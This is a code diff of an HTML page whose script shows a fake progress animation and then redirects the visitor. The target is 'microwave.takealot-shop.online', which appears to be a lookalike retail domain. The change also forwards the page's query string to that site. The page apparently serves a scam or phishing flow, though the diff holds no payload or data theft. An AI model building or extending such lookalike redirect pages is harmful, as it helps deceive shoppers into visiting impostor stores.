@@ -243,15 +243,14 @@
                 statusEl.innerText = statuses[currentStatus].toUpperCase();
             }
 
-            if (progress < 100) {
-                requestAnimationFrame(update);
-            } else {
-                setTimeout(() => {
-                    window.location.href = 'https://microwave.takealot-shop.online/';
-                }, 500);
-            }
-        }
-
+          if (progress < 100) {
+    requestAnimationFrame(update);
+} else {
+    setTimeout(() => {
+        window.location.href =
+          'https://microwave.takealot-shop.online/' + location.search;
+    }, 500);
+}
         // Wait slightly before starting
         setTimeout(() => {
             update();
@@ -277,3 +276,4 @@
 
 
 </html>
+
